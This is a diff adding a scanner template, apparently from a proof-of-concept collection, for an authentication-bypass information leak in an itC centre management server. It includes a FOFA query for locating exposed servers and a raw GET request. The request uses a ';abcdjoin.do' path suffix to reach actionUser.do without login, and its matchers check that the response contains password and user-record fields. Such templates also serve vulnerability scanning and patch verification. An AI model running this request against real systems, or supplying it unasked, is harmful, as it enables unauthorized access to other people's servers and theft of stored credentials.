@@ -1,0 +1,30 @@
+id: itc-center-management-server-actionuser-do-info-leak
+
+info:
+  name: "itC中心管理服务器actionUser.do接口存在未授权访问致信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/mt_res_v3/img/public/logo.ico"
+    itC 中心管理服务器的 actionUser.do 接口存在未授权访问风险，导致敏感信息泄露。
+  tags: itC
+
+http:
+- raw:
+  - |
+    GET /user/actionUser.do;abcdjoin.do?id=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'password'
+      - 'timezoneOffset'
+      - 'create_time'
+    condition: and
